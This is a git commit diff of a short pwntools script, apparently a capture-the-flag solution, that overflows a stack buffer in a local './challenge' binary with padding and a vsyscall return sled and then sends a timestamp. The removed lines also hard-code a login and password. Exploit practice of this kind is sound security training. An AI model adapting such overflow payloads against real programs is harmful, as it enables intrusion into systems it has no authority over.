58299ec290e96bbb47243bc16e23176f88396dac
Kichang Yang <kichangya@gmail.com>
2017-10-07 03:54:13 -0700

    .

--- wiki/nogada.py
+++ wiki/nogada.py
@@ -3,11 +3,23 @@
 #
 
 from pwn import *
+import time
 
-r = process('./challenge', aslr=False)
+
+#r = process('./challenge', aslr=False)
+r = process('./challenge')
+#gdb.attach(r, '''
+#break *0x555555554c52
+#'''
+#)
 
 r.send('USER\n')
 r.send('zomo\n')
 r.send('PASS\n')
-r.send('babo1234\n')
-r.interactive()
+
+payload = 'A'*0x88 + p64(0xdeadbeefdeadbeef) + p64(0xcafebabecafebabe) + p64(0xffffffffff600400)*24
+r.send(payload + '\n')
+
+r.send(p64(int(time.time())) + '\n')
+
+print r.recv(1024)
